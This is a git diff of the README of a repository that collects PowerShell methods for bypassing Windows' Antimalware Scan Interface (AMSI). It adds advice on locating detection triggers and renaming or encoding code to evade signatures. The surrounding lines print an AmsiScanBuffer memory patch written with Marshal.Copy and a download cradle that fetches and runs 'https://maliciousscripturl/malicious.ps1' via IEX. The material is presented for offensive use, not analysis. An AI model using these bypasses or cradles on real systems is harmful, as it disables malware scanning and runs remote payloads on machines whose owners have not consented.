@@ -1,10 +1,10 @@
 # Amsi-Bypass-Powershell #
 This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts.
 
-Some of the more well known Bypasses are detected by AMSI itself. So you have to obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working. Generally obfuscation can be used as bypass for AMSI.
+Most of the scripts are detected by AMSI itself. So you have to find the [trigger](https://github.com/RythmStick/AMSITrigger) and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime. Alternatively obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working.
 
 1. [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse "Goto Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse")
-2. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient")
+2. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
 3. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
 4. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
 5. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
@@ -49,7 +49,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 
-# Dont use net webclient #
+# Dont use net webclient # - Not Working anymore, there was a patch for it
 
     $webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’)
 
@@ -63,7 +63,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
     IEX($content)
 
-# The Short version of dont use powershell net webclient
+# The Short version of dont use powershell net webclient - Not Working anymore, there was a patch for it
 ```
 IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/malicious.ps1"))
 ```
